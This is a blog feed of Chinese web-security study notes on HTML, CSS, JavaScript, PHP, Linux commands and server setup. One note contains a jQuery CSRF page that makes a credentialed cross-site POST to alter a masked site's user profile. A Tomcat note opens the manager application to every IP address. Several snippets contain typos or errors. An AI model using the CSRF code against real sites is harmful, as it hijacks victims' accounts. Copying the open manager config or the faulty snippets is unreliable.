    <content type="text"><![CDATA[Abstract: 对第三周学习内容的总结 1. HTML123456789101112131415161718&lt;!--&lt;!DOCTYPE html&gt;声明为HTML5文档--&gt;&lt;!--HTML超文本标记语言--&gt;&lt;!--HTML文档也叫做web页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;HTML&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt; 标题 &lt;/h1&gt; &lt;p&gt; 段落 &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 文本域、密码字段和提交按钮 12345&lt;form name="input" action="htmlFormAction.php" method="get"&gt; Name: &lt;input type="text" name="name"&gt;&lt;br&gt; Password: &lt;input type="password" name="password"&gt; &lt;input type="submit"value="Submit"&gt; &lt;/form&gt; 单选按钮 1234&lt;form&gt; &lt;input type="radio" name="sex" value="male"&gt;Male&lt;br&gt; &lt;input type="radio" name="sex" value="female"&gt;Female&lt;br&gt;&lt;/form&gt; 复选框 1234&lt;form&gt; &lt;input type="checkbox" name="vehicle" value="Bike"&gt; I have a bike&lt;br&gt; &lt;input type="checkbox" name="vehicle" value="Car"&gt;I have acar&lt;/form&gt; 附：HTML速查列表 ​ HTML参考手册 HTML测验 测试网址：HTML测验 产生粗体字的HTML标签是&lt;b&gt;。 电子邮件链接：&lt;a href=&quot;mailto:xxx@yyy&quot;&gt;。 产生下拉列表的是&lt;select&gt;。 12345678&lt;form action=""&gt; &lt;select name="cars"&gt; &lt;option value="volvo"&gt;Volvo&lt;/option&gt; &lt;option value="saab"&gt;Saab&lt;/option&gt; &lt;option value="fiat"&gt;Fiat&lt;/option&gt; &lt;option value="audi" selected&gt; Audi&lt;/option&gt; &lt;/select&gt;&lt;/form&gt; XML和HTML的区别：HTML不要求标记的嵌套，配对等，不要求标记间具有一定的顺序，而XML则是严格要求嵌套，配对。 DOM代表文档对象模型，DTD是文档类型定义。 div标签的作用是：按逻辑划分页面文档。 meta标签作用用于：存储与浏览器和搜索引擎相关的信息。 对于HTML中的框架(Iframe/frameset)如何指定屏幕的其余部分：使用*。 当前文档和链接文档之间的关系是使用属性rel指定的。 target的默认属性值在HTML中为_self HTML标记用于定义图像映射中的可单击区域是&lt;area&gt; 2. CSS 选择器 CSS中id选择器以&quot;#&quot;来定义，类选择器以&quot;.&quot;来定义。 插入样式表三种方法 外部样式表 123&lt;head&gt; &lt;link rel="stylesheet" type="text/css" href="mystyle.css"&gt;&lt;/head&gt; 内部样式表 1234567&lt;head&gt;&lt;style&gt; hr &#123;color: sienna;&#125; p &#123;margin-left: 20px;&#125; body&#123;background-img: url("images/back40.gif");&#125;&lt;/style&gt;&lt;/head&gt; 内联样式 123&lt;p style="color:sienna; margin-left:20px"&gt; 段落 &lt;/p&gt; 优先级：内联 &gt; 内部 &gt; 外联 CSS测试 测试网址：CSS测试 外部样式表正确引用的方法： 1&lt;link rel="stylesheet" type="text/css" href="mystyle.css"&gt; HTML文档中，引用外部样式表正确位置是在&lt;head&gt;部分。 backgroud-color属性可用于改变背景颜色，color可改变某个元素的文本颜色。 测试二中实例 12345678910111213/*粗体*/p &#123;font-weight: bold&#125;/*超链接无下划线*/a &#123;text-decoration: none&#125;/*文本以大写字母开头*/text-transform: capitalize/*改变元素字体*/font-family/*边框上10 下5 左20 右1*//*上右下左*/border-widrh: 10 1 5 20/*产生带有正方形标记的项目列表*/list-style-type: square 测试三—五中实例 123456789101112/*使用CSS3创建圆角*/border-radius: 30px;/*CSS3中元素添加阴影*/box-shadow: 10px 10px 5px grey;/*使用CSS3强制换行*/word-wrap: break-word;/*CSS用于盒子居中*/margin: 0 auto;/*盒子内内联元素居中*/text-align: center;/*CSS中导入样式表正确语法*/@import url(css/example.css); 3. JavaScript​ HTML定义网页内容，CSS描述网页布局，JS介绍网页行为 JavaScript用法 123&lt;script&gt; alert("My First JavaScript");&lt;/script&gt; JavaScript输出 12345678&lt;!--弹出警告框--&gt;window.alert()&lt;!--将内容写到HTML文档中--&gt;document.write()&lt;!--写入到HTML元素--&gt;innerHTML&lt;!--写入到浏览器的控制台--&gt;console.log() 12345678910//单行注释/*多行注释*///JavaScript使用关键字var定义变量var x, lengthx = 5length = 6//JavaScript对大小写是敏感的 JavaScript事件 12345678910111213&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;JavaScript事件&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;button onclick="getElementById('demo').innerHTML=Date()"&gt; 现在时间 &lt;/button&gt; &lt;p id="demo"&gt; &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; ​ 常见的HTML事件 事件 描述 onchange HTML元素改变 onclick 用户点击HTML元素 onmouseover 用户在一个HTML元素上移动鼠标 onmouseout 用户从一个HTML元素上移开鼠标 onkeydown 用户按下键盘按键 onload 浏览器已完成页面的加载 JavaScript HTML DOM 改变HTML 123456//修改时间document.write(Date());//修改HTML内容document.getElementById("id").innerHTML="new text";//改变HTML属性document.getElementById("id").attribute="new attribute"; 改变CSS 12//改变HTML样式document.getElementById(id).style.property="new style" 1234567891011&lt;!--使用事件修改HTML样式--&gt;&lt;html&gt; &lt;body&gt; &lt;h1 id='id1'&gt; 标题 &lt;/h1&gt; &lt;button type="button" onclick="document.getElementById('id1').style.color='red'"&gt; 点我！点我！！ &lt;/button&gt; &lt;/body&gt;&lt;/html&gt; EventListener 1234element.addEventListener(event, function, useCapture)//第一个参数是事件的类型（"click"和"mousedown"）//第二个参数是事件触发后调用的函数//第三个参数是布尔值用于描述事件是冒泡还是捕获，该参数可选 1234567891011121314151617181920&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;EventListener&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt; 使用addEventListener()方法在用户点击按钮时执行函数 &lt;/p&gt; &lt;button id="myBtn"&gt; 点我！ &lt;/button&gt; &lt;script&gt; document.getElementById('myBtn').addEventListener("click", myFunction); function myFunction()&#123; alert("Hello World!"); &#125; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 创建新的HTML元素-appendChild() 123456789101112131415161718192021222324&lt;html&gt; &lt;head&gt; &lt;title&gt;创建新元素&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="div1"&gt; &lt;p id="p1"&gt; 第一个段落 &lt;/p&gt; &lt;p id="p2"&gt; 第二个段落 &lt;/p&gt; &lt;/div&gt; &lt;script&gt; var para=document.createElement("p"); var node=document.createTextNode("第三个段落") para.appendChile(node); var element=document.getElementById("div1"); var chile=document.getElementById("p1"); element.appendChild(para, child); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; BOM 常用函数 函数 作用 window.open()/close() 打开新窗口/关闭当前串口 window.moveTo() 移动当前窗口 window.resizeTo() 调整当前窗口的尺寸 location.hostname web主机的域名 location.pathname 当前页面的路径和文件名 location.port web主机的端口（80/443） location.protocol web协议 location.href 当前页面的URL loaction.assign() 加载新文档 更多BOM函数请访问BOM JavaScript测试 测试网址 外部脚本不能包含&lt;script&gt;标签。 如何在浏览器的状态栏放入一条消息？ 1window.status="put your message here" 预测以下JavaScript输出 1234&lt;script type="text/javascript"&gt; a = 8 + "8"; document.write(a);&lt;/script&gt; 88。 JavaScript中没有float/integer/double等数据类型。 JavaScript的.length属性用于计算任意字符串中的字符数。 trim()方法用于删除字符串开头和结尾的空格。 4. PHP PHP变量 以$符号开始，必须以字母和下划线开始，变量名只能包含字母数字字符以及下划线。 Note: 变量名是区分大小写的 echo和print语句 echo可以输出一个或多个字符串，输出速度比print快 print只允许输出一个字符串，返回值总为1 EOF使用说明 123456789&lt;?php$name=&quot;变量会被解析&quot;;$a=&lt;&lt;&lt;EOF$name&lt;br&gt;&lt;a&gt;html格式会被解析&lt;/a&gt;&lt;/br&gt;双引号和HTML格式外的其他内容都不会被解析 &quot;双引号外所有被排列好的格式都会被保留&quot;&quot;但是双引号内会保留转义符的转移效果，比如table:\t和换行:\n下一行&quot;EOF;echo $a;?&gt; PHP三种工作模式 工作模式 特点 CLI模式 命令行运行模式 CGI模式 通过CGI接口从HTTP服务器取得输入，然后把运行的结果通过CGI接口交给HTTP服务器，而HTTP服务器把结果送给浏览器 module模式 LAMP体系最常用的工作方式，php被编译为apache一个内置模块，启动时加载，当有一个php请求过来时，直接在httpd进程完成php解释运行，将结果返回。]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[练习1改进版]]></title>
    <url>%2F2019%2F08%2F04%2Fpractice1Update%2F</url>
    <content type="text"><![CDATA[Abstract: practice1实战二改进版 根据页面的行数，生成一个不同颜色的页面，0-3红色背景，4-6蓝色背景，7-9绿色背景，10-12黑色背景，13-15紫色背景，超过为白色。 12345678910111213141516171819202122232425262728293031323334353637&lt;html&gt; &lt;head&gt; &lt;title&gt;Line Color&lt;/title&gt; &lt;style&gt; ul&#123; list-style-type: none; margin: 0; padding: 0; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;?php $color=&quot;&quot;; echo &quot;&lt;ul&gt;&quot;; for($i=1; $i&lt;=15; $i++)&#123; if(0&lt;=$i &amp;&amp; $i&lt;=3)&#123; $color=&quot;red&quot;; &#125; elseif(4&lt;=$i &amp;&amp; $i&lt;=6)&#123; $color=&quot;yellow&quot;; &#125; elseif(7&lt;=$i &amp;&amp; $i&lt;=9)&#123; $color=&quot;blue&quot;; &#125; elseif(10&lt;=$i &amp;&amp; $i&lt;=12)&#123; $color=&quot;pink&quot;; &#125; elseif(13&lt;=$i &amp;&amp; $i&lt;=15)&#123; $color=&quot;green&quot;; &#125; echo &quot;&lt;li style=\&quot;background:$color; width=200px;color: $color\&quot;&gt;&amp;nbsp&lt;/li&gt;&quot;; &#125; echo &quot;&lt;/ul&gt;&quot;; ?&gt; &lt;/body&gt;&lt;/html&gt; 效果如下：]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[week3points]]></title>
    <url>%2F2019%2F08%2F03%2Fweek3points%2F</url>
    <content type="text"><![CDATA[Abstract: 对第三周学习内容的扫盲 1. EOF用下面的例子对EOF会有更深的理解 123456789&lt;?php $name=&quot;变量会被解析&quot;; $a=&lt;&lt;&lt;EOF $name&lt;br&gt;&lt;a&gt;html格式会被解析&lt;/a&gt;&lt;br/&gt;双引号和html格式外的其他内容都不会被解析 &quot;双引号外所有被排列好的格式都会被保留&quot; &quot;但是双引号内会保留转义符的转义效果，比如table:\t和换行:\n下一行&quot;EOF; echo $a;?&gt; 若把table:\t和换行:\n下一行换成table:\\t和换行:\\n效果如下： 2. PHP $_SERVER$_SERVER是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组PHP SERVER 3. GET vs POST GET和POST都创建数组，此数组包含键/值对，其中的键是表单控件名称，值是来自用户输入数据 GET和POST被视作$GET和$_POST，它们超全局变量，这意味着对它们的访问无需考虑作用域—无需任何特殊代码，就能够访问它们。 $_GET通过URL参数传递到当前脚本的变量数组； $_POST是通过HTTP POST传递到当前脚本变量数组 处理方式 不同点 GET 1. 所有变量名和值显示在URL中 2. 对发送的信息数量有限制 POST 1. 发送信息不可见，信息嵌入到HTTP请求主题中 2. 所发送信息数量无限制 此外，POST支持高阶功能，比如在向服务器上传文件时进行multi-part二进制输入。]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
        <category>知识盲点</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[练习1]]></title>
    <url>%2F2019%2F08%2F03%2Fpractice1%2F</url>
    <content type="text"><![CDATA[Abstract: PHP简单实战 实战一 ：根据之前学习的HTML知识，使用PHP来编写一个页面，页面内容显示出浏览器的信息。包括浏览器信息，系统信息，文件位置信息，PHP版本，文件行数。同时保证页面的美观。 123456789101112131415161718192021&lt;html&gt;&lt;head&gt; &lt;title&gt;显示浏览器信息&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;?php echo $_SERVER[&quot;HTTP_USER_AGENT&quot;]; echo &quot;&lt;br&gt;&quot;; echo PHP_OS; echo &quot;&lt;br&gt;&quot;; echo __DIR__; echo &quot;&lt;br&gt;&quot;; echo PHP_VERSION; echo &quot;&lt;br&gt;&quot;; echo __LINE__; echo &quot;&lt;br&gt;&quot;; echo __FILE__; ?&gt;&lt;/body&gt;&lt;/html&gt; 效果显示： 实战二 ：根据页面的行数，生成一个不同颜色的页面，0-3红色背景，4-6蓝色背景，7-9绿色背景，10-12黑色背景，13-15紫色背景，超过为白色。 1234&lt;?php echo &quot;&lt;body bgcolor=\&quot;white\&quot;&gt;&lt;/body&gt; &lt;div style =&apos;background-color:red;&apos;&gt;&lt;font color=\&quot;red\&quot;&gt;This is some text!&lt;/font&gt;&lt;/div&gt;&quot;; echo &quot;&lt;div style =&apos;background-color:red;&apos;&gt;&lt;font color=\&quot;red\&quot;&gt;This is some text!&lt;/font&gt;&lt;/div&gt;&quot;; echo &quot;&lt;div style =&apos;background-color:red;&apos;&gt;&lt;font color=\&quot;red\&quot;&gt;This is some text!&lt;/font&gt;&lt;/div&gt;&quot;;?&gt; 效果显示： 缺点：刚开始的想法是使用for循环+__LINE__实现，但并实现，目前方法过于死板，有改进空间。]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note15]]></title>
    <url>%2F2019%2F08%2F03%2Fnote15%2F</url>
    <content type="text"><![CDATA[Abstract: php基础语法和变量 1. 基础规范 PHP脚本形式&lt;?php ?&gt; PHP脚本可以单独存在，也可以与htm页面结合 PHP文件扩展名规范，一般是.php结尾，但可以使用其他命名，例如.phtm等 2. PHP三种运行方式 CLI就是命令行 1php -f index.php CGI模式： Common Gateway Interface，公共网关接口，程序须运行在网络服务器上 module模式： 3. 扩展加讲解 apache服务器或nginx php运行环境 数据库 4. PHP中的数据类型变量的数据类型： 布尔类型 整型 浮点型 字符串 资源 空类型 数组 对象 使用var_dump()来查看类型 PHP中的变量： 变量以$符号开始，后面跟着变量的名称 变量名必须以字母或者下划线字符开始 变量民只能包含字母数字字符以及下划线（A-z、0-9和_） 变量名不能包含空格 变量名是区分大小写的 STDOUT是客户端，只能在终端显示，不能在网页显示 PHP中的常量： 常量一旦赋值不会改变，尽量使用大写 常量分为系统常量和自定义常量 系统常量可以理解为值不会有改变的亮 定义常量： 使用PHP中的函数define()来定义常量 常量在使用的时候，不需要$符 常用的系统常量：123456789101112//php程序文件名/绝对路径__FILE__//被调用的文件脚本所在的目录__DIR__//函数名__FUNCTION__//php程序文件行数__LINE__//当前解析器的版本号PHP_VERSION//执行当前PHP版本的操作系统名称PHP_OS ​ php靠点连接字符串 12345&lt;?php $a = "name"; $b = "zs"; $c = $a . $b;?&gt; &lt;&lt;&lt;EOF EOF1234567&lt;?p echo &lt;&lt;&lt;EOF &lt;h1&gt;标题&lt;/h1&gt; &lt;p&gt;段落&lt;/p&gt;EOF;//结束需要独立一行且前后不能空格?&gt; php中除了单引号，任意字符放在单引号中将没有任何意义 php中双引号输入特殊字符，将有特殊意义 EOF中变量有意义，其他特殊字符，都没有意义 转移\普通字符变为特殊字符，特殊字符为普通字符]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note14]]></title>
    <url>%2F2019%2F08%2F01%2Fnote14%2F</url>
    <content type="text"><![CDATA[Abstract: JS BOM和jQuery，以及php环境的搭建 1. JS BOMBOM全名Browser Object Model，即浏览器对象模型。 Window方法 12345678#打开新窗口window.open()#关闭当前窗口window.close()#移动当前窗口window.moveTo()#调整当前窗口的尺寸window.resizeTo() Screen屏幕 1234#可用的屏幕宽度screen.availWidth#可用的屏幕高度screen.availHeight Location 1234567891011121314#web主机的域名location.hostname#当前页面的路径和文件名location.pathname#web主机的端口（80和443）location.port#使用的web协议（http或https）location.protocol#返回当前页面的URL（也可以用作跳转）location.href#返回URL的路径名location.pathname#加载新的文档location.assign History 1234#与在浏览器点击后退按钮相同history.back()#与在浏览器点击向前按钮相同history.forward() Navigator 12345678910111213141516171819&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;navigator用法&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="example"&gt;&lt;/div&gt; &lt;script&gt; txt = "&lt;p&gt;浏览器代号：" + navigator.appCodeName + "&lt;/p&gt;"; txt += "&lt;p&gt;浏览器名称：" + navigator.appName + "&lt;/p&gt;"; txt += "&lt;p&gt;浏览器版本：" + navigator.appVersion + "&lt;/p&gt;"; txt += "&lt;p&gt;启用Cookies: " + navigator.cookieEnabled + "&lt;/p&gt;"; txt += "&lt;p&gt;硬件平台：" + navigator.platform + "&lt;/p&gt;"; txt += "&lt;p&gt;用户代理：" + navigator.userAgent + "&lt;/p&gt;"; txt += "&lt;p&gt;用户代理语言：" + navigator.systemLanguage + "&lt;/p&gt;"; document.getElementById("example").innerHTML = txt; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 弹窗 123456#警告框window.alert("sometext")#确认框window.confirm("sometext")#提示框window.prompt("sometext", "defaultvalue") 计时 12345678#间隔指定的毫秒数不停的执行指定代码window.setInterval("javascript function", milliseconds)#停止setInterval()方法执行的函数代码window.clearInterval(intervalVariable)#第二个参数指示从当前起多少毫秒后执行第一个参数window.setTimeout("js function", milliseconds)#用于停止执行setTimeout()方法的函数代码window.clearTimeout(timeoutVariable) Cookie cookie是一些数据，存储于电脑上的文本文件中。当web服务器向浏览器发送web页面时，在连接关闭后，服务端不会记录用户信息。 cookie的作用就是用于解决“如何记录客户端的用户信息” 12* 当用户访问web页面时，他的名字可以记录在cookie中* 在用户下一次访问该页面时，可以在cookie中读取用户访问记录 1234#创建cookiedocument.cookie="username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/";#读取cookievar x = document.cookie; 2. JQuery​ 内容比较细碎，多看看jQuery教程 ​ 使用jQuery对***账户进行CSRF攻击，代码如下： 123456789101112131415161718192021222324252627282930313233&lt;html&gt;&lt;head&gt; &lt;title&gt;hack***&lt;/title&gt; &lt;script src="https://libs.baidu.com/jquery/2.0.0/jquery.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;script type="text/javascript"&gt; $.ajax(&#123; type:'POST', url:"http://www.***.com/api/user/info", dataType:'json', data: &#123; allow_status:"1", heading:"", id_number:"123456789123456789", nickname:"wangyingminghanpi", real_name:"本币", user_tag:'[]', &#125;, xhrFields:&#123; withCredentials:true //支持附带详细信息,可以携带cookie &#125;, crossDomain: true,//请求偏向外域,支持跨域请求 success: function (data) &#123; console.log(data); &#125; &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>DOM</tag>
        <tag>BOM</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note13]]></title>
    <url>%2F2019%2F08%2F01%2Fnote13%2F</url>
    <content type="text"><![CDATA[Abstract: 初探CSS+JS 1. CSS全程是Cascading Style Sheets 引入方式： 行内样式 1&lt;p style="display:none"&gt;我是段落&lt;/p&gt; 优先级最高 内嵌式 12345678910&lt;head&gt; &lt;style type="text/css"&gt; body&#123; background-color: red &#125; p&#123; margin-left: 20px &#125; &lt;/style&gt;&lt;/head&gt; 外链式 1&lt;link rel="stylesheet" type="text/css" href="css/login.css"&gt; 优先级：行内＞内嵌＞外链 更多内容请访问w3cschool 2. JSgetElementById用法： 12345678#“查找”id="demo"的HTML元素，并修改元素内容document.getElementById('demo').innerHTML = "hello world";#改变HTML元素的样式，是改变HTML属性的一种变种document.getElementById("demo").style.fontSize="25px";#通过改变display样式来隐藏HTML元素document.getElementById("demo").style.display="none";#通过改变display样式来显示隐藏HTML元素document.getElementById("demo").style.display="block"; ​ JS显示方案 ​ 使用window.alert()写入警告框 ​ 使用document.write()写入HTML输出 ​ 使用innerHTML写入HTML元素 ​ 使用console.log()写入浏览器控制台 JS HTML DOM文档 查找HTML元素 123456#通过元素id查找元素document.getElementById(id)#通过标签名来查找元素document.getElementByTagName(name)#通过类名来查找元素document.getElementByClassName(name) 改变HTML元素 123456#改变元素的inner HTMLelement.innerHTML= new html content#改变HTML元素的属性值element.attribute = new value#改变HTML元素的样式element.style.property = new style 添加和删除元素 12345678910#创建HTML元素document.createElement(element)#创建HTML元素document.removeChild(element)#添加HTML元素document.appendChild(element)#替换HTML元素document.replaceChile(element)#写入HTML输出流document.write(text) 添加事件处理程序 12#向onclick事件添加事件处理程序document.getElementById(id).onclick = function()&#123;code&#125; 源码： 1234567891011121314151617181920&lt;html&gt; &lt;title&gt;JS&lt;/title&gt; &lt;body&gt; &lt;div id="div1"&gt; &lt;p id="p1"&gt;这是一个段落。&lt;/p&gt; &lt;p id="p2"&gt;这是第二段落。&lt;/p&gt; &lt;/div&gt; &lt;script&gt; //新建&lt;p&gt;&lt;/p&gt;标签 var para = document.createElement("p"); //新建文档 var node = document.createTextNode("这是用js加的新段落。"); //将node添加到para中 → &lt;p&gt;文档&lt;/p&gt; para.appendChild(node); var element = document.getElementById("div1"); //将p加入到div中 element.appendChild(para); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note12]]></title>
    <url>%2F2019%2F07%2F30%2Fnote12%2F</url>
    <content type="text"><![CDATA[Abstract: 初学HTML 1. 些简单的标签12345678910111213&lt;html&gt; //&lt;html&gt;与&lt;/html&gt;之间的文本描述网页 &lt;head&gt; &lt;title&gt;网页标题&lt;/title&gt; &lt;/head&gt; &lt;body&gt; //&lt;body&gt;与&lt;/body&gt;之间的文本是可见的页面内容 &lt;h1&gt; 这是一个标题 //一级标题 &lt;/h1&gt; &lt;p&gt; 这是一个段落 //段落部分 &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 2. html中的标签：12345* HTML标题是通过`&lt;h1&gt;-&lt;h6&gt;`等标签进行定义的* HTML段落是通过`&lt;p&gt;`标签进行定义的* HTML链接是通过`&lt;a&gt;`标签进行定义的* HTML图像是通过`&lt;img&gt;`标签进行定义的* HTML表格是通过`table/thead/tbody/th/td`等标签来定义的 3. HTML form表单1&lt;form action="www.baidu.com" method="get" enctype="application/x-form-urlenconded"&gt; 123* Action 属性表明表单将要提交到哪里* Method 表示提交用的方法分别为`get`和`post`可选* Enctype 规定在发送表单数据前对数据进行编码的格式 4. 输入框&lt;input&gt;标签最常用1234567* `type=&quot;text&quot;` 普通的文本输入框* `type=&quot;password&quot;`带星号的密码输入框* `type=&quot;radio&quot;`单选框，同一类型要有统一的`name`属性，表明是一类* `type=&quot;checkbox&quot;`复选框，添加`checked`属性会默认选中* `type=&quot;file&quot;` 文件上传选择* `type=&quot;email&quot;`带简单验证的邮箱输入* `&lt;textarea&gt;`标签input只能单行输入，`textarea`可以多行输入]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[stage1知识盲点]]></title>
    <url>%2F2019%2F07%2F30%2Fstage1-exam%2F</url>
    <content type="text"><![CDATA[Abstract: 知识盲点总结 运行一个脚本，用户不需要什么样的权限？ read write execute browse on the directory 在bash中，在一条命令后加入1&gt;&amp;2意味着： 标准错误输出重定向到标准输入 标准输入重定向到标准错误输出 标准输出重定向到标准错误输出 标准输出重定向到标准输入 1表示标准输出，2表示标准错误，&amp;表示等同于的意思 下面哪条命令可以把f1.txt复制为f2.txt： cp f1.txt |f2.txt cat f1.txt | f2.txt cat f1.txt &gt; f2.txt copy f1.txt | f2.txt 如何显示Linux系统中注册的用户数（包含系统用户）？ account-l nl /etc/passwd |head wc –user /etc/passwd wc –lines /etc/passwd word count，--line/-l只显示行数 命令kill 9的含义是： kills the process whose PID is 9 kills all processes belonging to UID 9 sends SIGKILL to the process whose PID is 9 sends SIGTERM to the process whose PID is 9 在vi中退出不保存的命令是： :q :w :wq :q! 下面哪个协议使用了两个以上的端口： telnet FTP rsh HTTP 什么命令用来只更行已经安装过的rpm软件包： rpm -U *.rpm rpm -F *.rpm rpm -e *.rpm rpm -q *.rpm ping使用的协议是： TCP UDP SMB ICMP Linux系统中添加一个用户，改变账号过期时间，用哪个命令： usermod -a usermod -d usermod -x usermod -e 静态IP和动态IP的区别，具体应用场景 静态IP：IP地址是手动分配的，通常需要付费 动态IP：动态IP是自动分配的 名称 优点 缺点 静态IP 地址不变—适用于web服务器，电子邮件服务器和其他internet服务器 比动态IP贵 静态IP对于VoIP和游戏应用程序更可靠 需要额外的安全性 动态IP 比静态IP地址便宜 需要DHCP服务器才能获取IP地址 更改IP地址可提供更多隐私 非静态的，每次IP地址更改时，可能需要再次找到你的IP 搭建LAMP所需要的命令： 123456789101112131415161718192021222324252627#安装apache服务[root]$ yum install httpd#设置开机启动[root]$ systemctl enable httpd#开启服务[root]$ systemctl start httpd#设置防火墙[root]$ firewall-cmd --zone=public --add-port=80/tcp --permanent[root]$ firewall-cmd --zone=public --add-port=433/tcp --permanent#重新加载，方可生效[root]$ firewall-cmd --reload#安装mysql服务[root]$ yum install mariadb-server#设置开机启动[root]$ systemctl enable mariadb#启动服务[root]$ systemctl start mariadb#初始化mysql[root]$ mysql_secure_installation#安装php[root]$ yum install php php-gd php-mysql php-pdo php-*#重启apache[root]$ systemctl restart httpd#修改网站根目录的用户和用户组[root]$ chown -R apache:apache /var/www/html]]></content>
      <categories>
        <category>Web Security</category>
        <category>summary</category>
      </categories>
      <tags>
        <tag>Linux基本命令 - 搭建服务</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdown语法]]></title>
    <url>%2F2019%2F07%2F29%2Fsimpleapp%2F</url>
    <content type="text"><![CDATA[Abstract: 用typora写markdown文档的语法 标题下划线 下划线 强调重要 斜体斜体 删除删除 方框框起来 注释今天吃啥呀^1 高亮==高亮== 角标上角标：x^2^ 下角标：H2O $x^2+x1$ 转义# List有序 无序 1 2 1 2 todo list 背单词 整理笔记 Table 分割线 插入链接Typora 数学公式$$&lt;Empty \space Math \space Block&gt;$$ 代码12def abc() print() 表情:sweat: :happy: 引用[引用] 引用 目录[TOC]]]></content>
      <categories>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>typora</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[week2sum]]></title>
    <url>%2F2019%2F07%2F29%2Fweek2sum%2F</url>
    <content type="text"><![CDATA[Abstract: 对第二周学习的内容进行总结 周一Linux权限1.内容简介 Linux权限控制 git服务器搭建与安全检查 tomcat服务器搭建与安全检查 2.几种文件类型 [d] 是目录 [-] 是文件 [l] 是链接文件(link file) 3.读写执行权限 文件类型 属主权限 属组权限 其他用户权限 0 123 456 789 d rwx r-x r-x 目录文件 读写执行 读—执行 读—执行 对于目录的rwx 123* r可以显示文件夹的结构* w可以在文件夹里添加删除文件* x可以进入到文件夹 权限命令：rwx在系统中对应一个个的值，r-4，w-2，x-1 chown修改当前文件或文件夹的所属用户 1chown root:root /tmp/tmp1 1chown -R root:root /tmp/tmp1 chmod修改当前文件或文件夹的权限 语法：chmod [who] [+|-|=] [mode] 文件名 操作对象who： u表示“用户(user)”，即文件或目录的所有者 g表示”同组(group)用户”，即与文件属主有相同组ID的所有用户 o表示”其他(other)用户” a表示”所有(all)用户”，它是系统默认值 推荐使用数字的方式修改文件或者文件夹的权限 操作符可以是： +添加某个权限 -取消某个权限 =赋予给定权限并取消其他所有权限 *不指定用户的情况下，=只会给文件所有者加权限，+给所有者加权限 一个网站最合理的权限是755 4.渗透测试中常用的命令 whoami 查看当前用户 tar 压缩和解压文件 netstat 查看网络状态 nslookup 查看dns信息 ps 查看运行的程序 top 实时查看运行的程序 service 使用service控制服务启动关闭 curl 获取网页，可以使用输出重定向来下载文件 wget 下载文件 1more /etc/apt/sources.list sources.list是各种软件源，常用的源有阿里云、清华大学、中科院 1sudo apt-get update Note: 推荐关机快照 周二tomcat和git服务器搭建1.内容简介 复习 tomcat服务器搭建 2.网络不通该如何调试先用ficonfig查看网卡信息，若正常，ping 网卡，若不正常，查看配置文件和网络环境；若网卡默认不启用，修改配置文件，onboot=yes 重启网络服务，配置文件路径：/etc/sysconfig/network-scripts/ifcfg-eth0 123cat /etc/sysconfig/network-script/ifcfg-eth0vi /etc/sysconfig/network-script/ifcfg-eth0service network restart 若网络环境是dhcp，修改上网方式为dhcp，重启网络服务 若网络环境是静态ip，修改上网方式为static，ipaddr=, netmask=, gateway= 能够ping通8.8.8.8 1curl www.baidu.com 若不能打开，查看dns配置文件 1vi /etc/resolv.conf 添加servername 1.1.1.1 3.搭建tomcat服务器12345#启动防火墙systemctl start firewalld#将80端口添加到防火墙例外并重启firewall-cmd --zone=public --add-por=8080/tcp --permanentfirewall-cmd --reload 防火墙=硬件+软件 1yum apt-get -y install tomcat 1vi .../apache-tomcat-8.5.43/webapps/manager/META-INF/context.xml 修改tomcat配置文件为 12345&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Context antiResourceLocking="false" privileged="true"&gt; &lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\d+\.\d+\.\d+\.\d+" /&gt;&lt;/Context&gt; 